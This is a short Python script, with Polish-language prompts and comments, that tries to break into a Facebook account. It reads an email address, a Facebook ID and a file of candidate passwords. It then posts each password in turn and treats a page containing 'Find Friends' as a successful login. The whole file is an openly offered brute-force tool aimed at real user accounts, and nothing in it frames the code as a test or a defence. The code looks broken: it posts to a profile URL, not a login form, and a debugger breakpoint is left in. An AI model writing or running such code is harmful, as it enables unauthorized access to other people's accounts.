import requests
import pdb

def brute_force(username, fb_id, passwords):
    url = f'https://www.facebook.com/{fb_id}'

    with requests.Session() as session:
        for password in passwords:
            data = {'email': username, 'pass': password}

            response = session.post(url, data=data)

            if 'Find Friends' in response.text:
                print(f'Prawidłowe hasło znalezione: {password}')
                break
            else:
                print(f'Nieprawidłowe hasło: {password}')

def main():
    email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
    fb_id = input('Podaj identyfikator Facebooka: ')
    password_file = input('Podaj nazwę pliku z hasłami: ')

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file]

    pdb.set_trace()  # Dodaj to miejsce do debugowania
    brute_force(email, fb_id, passwords)

if __name__ == '__main__':
    main()
